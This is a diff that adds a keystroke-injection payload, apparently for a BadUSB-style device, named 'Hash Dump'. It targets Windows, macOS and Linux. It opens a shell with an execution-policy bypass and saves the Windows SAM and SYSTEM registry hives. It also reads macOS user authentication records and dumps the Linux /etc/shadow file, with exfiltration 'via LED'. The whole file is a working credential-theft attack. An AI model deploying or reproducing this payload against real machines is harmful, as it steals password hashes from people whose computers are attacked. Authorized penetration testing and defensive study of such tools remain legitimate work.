@@ -1,0 +1,26 @@
+NAME Hash Dump
+DESCRIPTION Extracts OS password hashes (requires admin/root); exfils via LED
+CATEGORY credential
+PLATFORMS WIN,MAC,LINUX
+OPTION DELAY 2000 "Initial HID enumeration delay (ms)"
+PLATFORM WIN
+DELAY {{DELAY}}
+GUI r
+DELAY 800
+STRING powershell -nop -ep bypass
+ENTER
+DELAY 1200
+EXFIL reg save HKLM\SAM $env:TEMP\s.hiv /y 2>&1; reg save HKLM\SYSTEM $env:TEMP\y.hiv /y 2>&1; Write-Output "SAM+SYSTEM saved to $env:TEMP"
+PLATFORM MAC
+DELAY {{DELAY}}
+GUI SPACE
+DELAY 700
+STRING Terminal
+ENTER
+DELAY 1400
+EXFIL sudo dscl . -readall /Users UniqueID RealName AuthenticationAuthority 2>/dev/null | head -60
+PLATFORM LINUX
+DELAY {{DELAY}}
+CTRL ALT t
+DELAY 1400
+EXFIL sudo cat /etc/shadow 2>/dev/null | head -20
